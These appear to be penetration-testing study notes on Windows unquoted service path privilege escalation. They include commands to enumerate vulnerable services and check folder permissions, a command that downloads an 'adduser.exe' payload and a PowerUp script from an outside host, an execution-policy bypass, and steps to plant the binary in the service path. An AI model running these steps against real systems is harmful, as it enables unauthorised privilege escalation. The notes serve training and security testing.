# Unquoted Service Paths

## Overview

During service enumeration, it is important to identify services whose executable paths are not properly quoted. If a service path contains spaces and is unquoted, Windows may attempt to execute binaries in unintended locations, potentially allowing privilege escalation if a malicious executable is placed in a writable directory along the path.

---
We can find unquoted paths with the command below;
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v ""
```

When we have write permissions to a service but cannot replace files. Each service maps to a file, if the file is not enclosed in quotes we can attack.
```
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
- To find spaces in paths 

For C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe, use icacls to check if we can write to any path 
```
icacls "C:\Program Files\Enterprise Apps"
```
- Do this for every directory in the path, unlikely we will be able to write to "Program Files"

Once found;
```
iwr -uri http://192.168.48.3/adduser.exe -Outfile Current.exe
```
```
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

PowerUp.ps1
---
```
iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
..\PowerUp.ps1
```
```
Get-UnquotedService
```

Abuse function:
```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
- Best to not use abuse function on the exam


```
# UNQUOTED SERVICE PATHS

 Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName | Format-Table -Wrap

icacls "C:\Program Files (x86)\Privacyware"

.\accesschk.exe -ucqv user unquotedsvc # checking if you have permission to restart the service

.\accesschk.exe -uwdq "C:\Program Files\Unquoted Path Service\"
```
